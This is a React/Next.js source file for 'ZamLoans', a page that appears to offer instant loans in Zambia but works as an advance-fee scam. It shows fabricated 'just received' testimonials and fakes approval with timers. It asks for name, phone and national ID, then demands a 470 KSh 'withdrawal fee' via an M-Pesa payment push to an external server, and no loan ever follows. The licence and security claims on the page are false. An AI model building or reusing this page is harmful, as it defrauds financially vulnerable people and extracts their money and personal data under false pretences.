"use client";

import { useState, useEffect } from "react";
import {
  Clock,
  Shield,
  Wallet,
  Zap,
  User,
  Phone,
  CreditCard,
  CheckCircle2,
  Loader2,
  Bell,
} from "lucide-react";

const loans = [
  500, 1000, 1500, 2000,
  2500, 3000, 3500, 3800,
  4500, 5000, 6000, 7500,
  8000, 10000, 12000, 15000,
];

const testimonials = [
  "Brian from Lusaka just received ZMW 12,500",
  "Mary from Kitwe just received ZMW 8,700",
  "Kelvin from Ndola just received ZMW 15,200",
  "Faith from Kabwe just received ZMW 6,900",
  "John from Livingstone just received ZMW 11,400",
];

export default function Home() {
  const [selectedLoan, setSelectedLoan] = useState<number | null>(null);
  const [step, setStep] = useState<
    "home" | "processing" | "form" | "withdraw"
  >("home");
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  useEffect(() => {
    const interval = setInterval(() => {
      const random =
        testimonials[Math.floor(Math.random() * testimonials.length)];

      setToast(random);

      setTimeout(() => {
        setToast("");
      }, 4500);
    }, 7000);

    return () => clearInterval(interval);
  }, []);

  const handleLoanSelect = (loan: number) => {
    setSelectedLoan(loan);
    setStep("processing");

    setTimeout(() => {
      setStep("form");
    }, 2500);
  };

  const handleSubmit = () => {
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      setStep("withdraw");
    }, 3000);
  };

  const withdrawalFee = 470;

  if (step === "processing") {
    return <ProcessingScreen />;
  }

  if (step === "form") {
    return (
      <ApplicationForm
        selectedLoan={selectedLoan!}
        onSubmit={handleSubmit}
        loading={loading}
      />
    );
  }

  if (step === "withdraw") {
    return (
      <WithdrawPage
        amount={selectedLoan!}
        fee={withdrawalFee}
      />
    );
  }

  return (
    <main className="min-h-screen bg-slate-50">
      {/* Hero */}
      <section className="bg-gradient-to-br from-emerald-600 via-emerald-700 to-slate-900 text-white py-10 md:py-16 px-4">
        <div className="max-w-6xl mx-auto text-center">
          <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-md px-4 py-2 rounded-full mb-6 text-sm font-medium">
            <Shield className="w-4 h-4" />
            Trusted Across Zambia
          </div>

          <h1 className="text-4xl md:text-6xl font-black mb-4">
            ZamLoans
          </h1>

          <p className="text-base md:text-xl text-emerald-50 max-w-3xl mx-auto">
            Fast Zambian loans with secure approval,
            transparent fees, and instant withdrawals.
          </p>
        </div>
      </section>
{/* Features */}
<section className="-mt-4 px-4 mb-8">
  <div className="max-w-5xl mx-auto grid grid-cols-2 sm:grid-cols-3 gap-3">
    <div className="col-span-2 sm:col-span-1">
      <FeatureCard
        icon={<Clock className="w-5 h-5 text-emerald-600" />}
        title="24 Hour Approval"
        desc="Quick application review"
      />
    </div>

    <FeatureCard
      icon={<Shield className="w-5 h-5 text-emerald-600" />}
      title="Secure & Safe"
      desc="Protected personal data"
    />

    <FeatureCard
      icon={<Wallet className="w-5 h-5 text-emerald-600" />}
      title="Instant Withdrawal"
      desc="Funds sent immediately"
    />
  </div>
</section>

      {/* Loans */}
      <section className="px-4 pb-16">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-black text-slate-900 mb-2">
            Choose Your Loan
          </h2>

          <p className="text-slate-600 mb-8">
            Select the amount that suits your needs.
          </p>

          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            {loans.map((loan) => (
              <div
                key={loan}
                className="bg-white rounded-2xl border border-slate-200 p-4 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all"
              >
                <p className="text-xs text-slate-500 mb-2">
                  Loan Amount
                </p>

                <h3 className="text-2xl md:text-3xl font-black text-slate-900 mb-4">
                  ZMW {loan.toLocaleString()}
                </h3>

                <div className="inline-flex items-center gap-2 bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full text-xs font-semibold mb-4">
                  <Zap className="w-3 h-3 fill-current" />
                  Instant
                </div>

                <button
                  onClick={() => handleLoanSelect(loan)}
                  className="w-full py-3 rounded-xl bg-slate-100 hover:bg-yellow-400 text-slate-900 font-bold transition-all"
                >
                  Select
                </button>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Live Toast */}
      {toast && (
        <div className="fixed bottom-4 left-4 right-4 md:left-auto md:right-6 md:w-auto z-50 animate-slide-up">
          <div className="bg-slate-900 text-white px-5 py-4 rounded-2xl shadow-2xl flex items-center gap-3">
            <Bell className="w-5 h-5 text-emerald-400" />
            <span className="text-sm font-medium">
              {toast}
            </span>
          </div>
        </div>
      )}

      <footer className="bg-slate-900 text-white py-8 text-center px-4">
        <p className="text-slate-400 text-sm">
          © 2026 ZamLoans. Licensed Financial Services Provider.
        </p>
      </footer>
    </main>
  );
}

function ProcessingScreen() {
  return (
    <main className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl shadow-2xl p-10 text-center max-w-md w-full">
        <Loader2 className="w-16 h-16 text-emerald-600 animate-spin mx-auto mb-6" />

        <h2 className="text-3xl font-black text-slate-900 mb-3">
          Processing
        </h2>

        <p className="text-slate-600">
          Please wait while we prepare your application...
        </p>
      </div>
    </main>
  );
}

function FeatureCard({
  icon,
  title,
  desc,
}: {
  icon: React.ReactNode;
  title: string;
  desc: string;
}) {
  return (
    <div className="bg-white rounded-2xl p-5 shadow-lg">
      <div className="w-14 h-14 rounded-2xl bg-emerald-50 flex items-center justify-center mb-4">
        {icon}
      </div>

      <h3 className="text-xl font-bold text-slate-900 mb-1">
        {title}
      </h3>

      <p className="text-slate-600 text-sm">
        {desc}
      </p>
    </div>
  );
}

function ApplicationForm({
  selectedLoan,
  onSubmit,
  loading,
}: {
  selectedLoan: number;
  onSubmit: () => void;
  loading: boolean;
}) {
  return (
    <main className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="w-full max-w-xl bg-white rounded-3xl shadow-2xl p-6 md:p-8">
        <div className="mb-6">
          <p className="text-emerald-600 font-semibold mb-2">
            Selected Loan
          </p>
          <h1 className="text-4xl font-black text-slate-900">
            ZMW {selectedLoan.toLocaleString()}
          </h1>
        </div>

        <div className="space-y-4">
          <Input icon={<User />} placeholder="Full Name" />
          <Input icon={<Phone />} placeholder="Phone Number MTN/Airtel/Saff" />
          <Input icon={<CreditCard />} placeholder="National ID" />

          <select className="w-full border border-slate-200 rounded-2xl px-5 py-4 outline-none focus:border-emerald-500">
            <option>Business</option>
            <option>School Fees</option>
            <option>Emergency</option>
            <option>Personal Use</option>
          </select>

          <button
            onClick={onSubmit}
            disabled={loading}
            className="w-full py-4 rounded-2xl bg-emerald-600 hover:bg-emerald-700 text-white font-black text-lg"
          >
            {loading ? "Submitting..." : "Continue"}
          </button>
        </div>
      </div>
    </main>
  );
}
function WithdrawPage({
  amount,
  fee,
}: {
  amount: number;
  fee: number;
}) {
  const [phone, setPhone] = useState("");
  const [paying, setPaying] = useState(false);
const handlePayment = async () => {
  if (!phone || !phone.trim()) {
    alert("Please enter your M-Pesa number.");
    return;
  }

  if (!fee) {
    alert("Amount is missing.");
    return;
  }

  setPaying(true);

  try {
    // normalize phone (07..., 01..., 254...)
    let formattedPhone = phone.trim().replace(/\D/g, "");

    if (formattedPhone.startsWith("07") || formattedPhone.startsWith("01")) {
      formattedPhone = "254" + formattedPhone.slice(1);
    } else if (formattedPhone.startsWith("0")) {
      formattedPhone = "254" + formattedPhone.slice(1);
    } else if (!formattedPhone.startsWith("254")) {
      alert("Invalid phone number format");
      setPaying(false);
      return;
    }

    const response = await fetch(
      "https://starlink-backend-yb3n.onrender.com/api/runPrompt",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: formattedPhone,
          amount: Number(fee),
          local_id: `ZAMLOAN_${Date.now()}`,
          transaction_desc: `ZamLoans Withdrawal Fee KES ${fee}`,
          till_id: "default",
        }),
      }
    );

    const data = await response.json();

    if (data.status === true) {
      alert(
        "STK Push sent successfully. Check your phone and enter your M-Pesa PIN."
      );
    } else {
      alert(data.msg || "Payment failed. Please try again.");
    }
  } catch (err) {
    console.error(err);
    alert("Unable to connect to the payment server.");
  } finally {
    setPaying(false);
  }
};
  return (
    <main className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="w-full max-w-lg bg-white rounded-3xl shadow-2xl p-6 md:p-8">
        
        <div className="text-center mb-8">
          <h1 className="text-4xl font-black text-slate-900">
            Withdraw Loan
          </h1>
        </div>

        <div className="space-y-4">
         <div className="bg-emerald-600 text-white rounded-2xl border border-emerald-700 shadow-lg">
  <Info
    label="Approved Amount"
    value={`KSh ${(amount * 13.2).toLocaleString()}`}
  />
</div>

          <Info
            label="Withdrawal Fee"
            value={`KSh ${fee.toLocaleString()}`}
          />

         <p className="text-emerald-600 italic">
  Pay Processing fee to receive your loan instantly....
</p>
          {/* FIXED INPUT */}
          <input
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="Enter M-Pesa Number"
            className="w-full border rounded-2xl py-4 px-4 outline-none focus:border-emerald-500"
          />

          {/* FIXED BUTTON */}
          <button
            onClick={handlePayment}
            disabled={paying}
            className="w-full py-4 rounded-2xl bg-emerald-600 hover:bg-emerald-700 text-white font-black text-lg"
          >
            {paying ? "Processing..." : `Pay KSh ${fee} & Withdraw`}
          </button>
        </div>
      </div>
    </main>
  );
}
function Input({
  icon,
  placeholder,
}: {
  icon: React.ReactNode;
  placeholder: string;
}) {
  return (
    <div className="relative">
      <div className="absolute left-4 top-4 text-slate-400">
        {icon}
      </div>

      <input
        className="w-full border border-slate-200 rounded-2xl py-4 pl-14 pr-4 outline-none focus:border-emerald-500"
        placeholder={placeholder}
      />
    </div>
  );
}

function Info({
  label,
  value,
}: {
  label: string;
  value: string;
}) {
  return (
    <div className="bg-slate-50 rounded-2xl p-5">
      <p className="text-slate-500 mb-1 text-sm">
        {label}
      </p>

      <h3 className="text-3xl font-black text-slate-900">
        {value}
      </h3>
    </div>
  );
}